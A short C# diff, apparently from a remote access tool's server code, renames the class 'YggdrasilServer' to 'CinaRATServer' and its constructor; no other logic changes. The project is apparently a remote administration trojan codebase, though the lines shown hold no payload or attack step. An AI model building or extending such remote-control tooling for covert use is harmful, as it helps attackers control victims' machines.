@@ -6,7 +6,7 @@ using xServer.Core.Packets;
 
 namespace xServer.Core.Networking
 {
-    public class YggdrasilServer : Server
+    public class CinaRATServer : Server
     {
         /// <summary>
         /// Gets the clients currently connected and authenticated to the server.
@@ -69,7 +69,7 @@ namespace xServer.Core.Networking
         /// <summary>
         /// Constructor, initializes required objects and subscribes to events of the server.
         /// </summary>
-        public YggdrasilServer() : base()
+        public CinaRATServer() : base()
         {
             base.Serializer = new Serializer(PacketRegistery.GetPacketTypes());
 
